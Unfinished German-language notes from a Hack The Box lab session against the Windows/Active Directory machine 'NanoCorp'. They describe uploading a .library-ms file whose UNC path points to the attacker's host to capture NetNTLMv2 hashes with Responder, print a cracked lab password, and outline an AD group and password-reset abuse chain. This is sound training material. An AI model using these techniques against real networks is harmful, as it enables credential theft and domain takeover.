# Hack The Box: NanoCorp Notes

> In-Progress-Notizen, kein vollständiges Writeup. Keine Flags enthalten.

## Überblick

NanoCorp ist eine Windows/Active-Directory-Maschine mit Web-Upload-Fläche und mehreren AD-Diensten. Der bisherige Fortschritt führte zu gültigen Credentials für `NANOCORP\\web_svc` und bestätigten AD-Rechten, aber die Box wurde in dieser Session nicht bis root/Administrator abgeschlossen.

## Recon

Target:

```text
10.129.243.199
```

Domain:

```text
nanocorp.htb
```

DC:

```text
dc01.nanocorp.htb
```

VHosts:

```text
nanocorp.htb
hire.nanocorp.htb
```

Offene Dienste:

```text
53/tcp    DNS
80/tcp    HTTP Apache/2.4.58 Win64 PHP/8.2.12
88/tcp    Kerberos
135/tcp   MSRPC
139/tcp   NetBIOS
445/tcp   SMB
389/tcp   LDAP
636/tcp   LDAPS
3268/tcp  Global Catalog
3269/tcp  Global Catalog SSL
3389/tcp  RDP
5986/tcp  WinRM HTTPS
6556/tcp  CheckMK agent 2.1.0p10
9389/tcp  ADWS
```

## Web-Fund

`hire.nanocorp.htb` hatte einen ZIP-Upload für Bewerbungen/Resumes:

```text
/upload.php
```

## Initialer Credential-Fund über Outbound Authentication

Ein ZIP mit `.library-ms`-Payload wurde hochgeladen, wobei der Payload eine SMB-Referenz auf die eigene VPN-IP enthielt:

```text
\\<HTB_TUN_IP>\\SHARE\\icon.ico
```

Responder auf dem VPN-Interface fing NetNTLMv2-Hashes ab:

```text
NANOCORP\\web_svc
```

Der Hash wurde lokal mit RockYou geknackt:

```text
web_svc : dksehdgh712!@#
```

## AD-Rechte und weitere Schritte

Mit `web_svc` wurde eine AD-Rechtekette geprüft:

- `web_svc` hatte AddSelf-Rechte auf die Gruppe `IT_Support`
- Hinzufügen von `web_svc` zu `IT_Support` gelang
- `IT_Support` sollte das Passwort von `monitoring_svc` ändern können
- `monitoring_svc` ist Mitglied von `Protected Users` und `Remote Management Users`

Versuche, das Passwort von `monitoring_svc` zu setzen, wurden teilweise als erfolgreich gemeldet, aber die Kerberos-Validierung schlug mit `KDC_ERR_PREAUTH_FAILED` fehl. Weitere Reset-Versuche waren durch Minimum Password Age oder Rechtebedingungen blockiert.

## Blocker

- `web_svc` Kerberos funktioniert grundsätzlich.
- `monitoring_svc` ist wegen `Protected Users` nicht sinnvoll per NTLM/LDAP Simple Auth validierbar.
- Passwort-Reset-State für `monitoring_svc` war unklar.
- DNS-Record-Erstellung als `web_svc` schlug mit `insufficientAccessRights` fehl.
- CheckMK 2.1.0p10 auf TCP 6556 bleibt ein möglicher Alternativpfad.

## Wahrscheinliche Chain

```text
ZIP upload on hire.nanocorp.htb
    -> .library-ms outbound SMB auth
    -> Capture NetNTLMv2 for web_svc
    -> Crack web_svc password
    -> AddSelf into IT_Support
    -> Force-change monitoring_svc password
    -> Use monitoring_svc via WinRM/Kerberos
    -> Continue AD privesc / relay path
```

## Lokale Artefakte

```text
/Users/anderson/htb/10.129.243.199/session-summary.md
/Users/anderson/htb/10.129.243.199/web_svc_hashes.txt
/Users/anderson/htb/10.129.243.199/web_svc_password.txt
/Users/anderson/htb/10.129.243.199/checkmk-raw.txt
/Users/anderson/htb/10.129.243.199/exploit.library-ms
/Users/anderson/htb/10.129.243.199/exploit-library.zip
```

## Status

Nicht abgeschlossen. Dieses Dokument ist nur eine Arbeitsnotiz und sollte erst nach Abschluss der Box in ein vollständiges Writeup umgewandelt werden.
